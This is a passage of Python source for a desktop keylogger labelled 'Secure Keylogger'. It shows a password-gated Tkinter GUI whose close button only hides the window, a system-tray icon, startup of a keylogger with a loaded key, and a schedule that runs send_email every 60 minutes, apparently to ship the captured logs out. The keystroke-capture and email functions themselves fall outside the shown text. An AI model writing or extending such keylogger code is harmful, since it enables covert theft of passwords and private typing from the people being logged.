            # Focus and display
            dialog.transient(root)
            dialog.grab_set()
            dialog.deiconify()
            dialog.lift()
            dialog.focus_force()
            password_entry.focus()
            
            dialog.wait_window()
            root.destroy()
            
            return result[0]
            
        except Exception as e:
            logging.error(f"Error in password dialog: {e}")
            print(f"Error in password dialog: {e}")
            return False
        
    if ask_password():
        try:
            root = tk.Tk()
            app = KeyloggerGUI(root)
            root.protocol("WM_DELETE_WINDOW", lambda: (root.withdraw()))
            
            # Make sure window is visible
            root.deiconify()
            root.lift()
            root.focus_force()
            
            logging.info("Starting main loop")
            print("Starting main loop...")
            root.mainloop()
        except Exception as e:
            logging.error(f"Error in main window: {e}")
            print(f"Error in main window: {e}")
            messagebox.showerror("Error", f"Failed to start application: {e}")

def setup_tray():
    logging.debug("Setting up system tray")
    def on_clicked(icon, item):
        if str(item) == "Show":
            logging.debug("Show menu item clicked")
            launch_gui()
        elif str(item) == "Exit":
            logging.debug("Exit menu item clicked")
            stop_logging()
            icon.stop()
            
    # Create a better looking tray icon
    image = Image.new('RGB', (64, 64), color=(0, 100, 200))
    menu = pystray.Menu(
        pystray.MenuItem("Show", lambda icon, item: launch_gui()),
        pystray.MenuItem("Exit", lambda icon, item: (stop_logging(), icon.stop()))
    )
    global tray_icon
    tray_icon = pystray.Icon("Keylogger", image, "Secure Keylogger", menu)
    tray_icon.run()
    logging.debug("System tray setup completed")

if __name__ == "__main__":
    logging.info("Starting main program")
    print("Starting main program...")
    
    try:
        schedule.every(60).minutes.do(send_email)
        threading.Thread(target=run_schedule, daemon=True).start()
        threading.Thread(target=setup_tray, daemon=True).start()
        keylogger.start(load_key())
        launch_gui()
    except Exception as e:
        logging.error(f"Error in main program: {e}")
        print(f"Error in main program: {e}")
        messagebox.showerror("Error", f"Application failed to start: {e}")

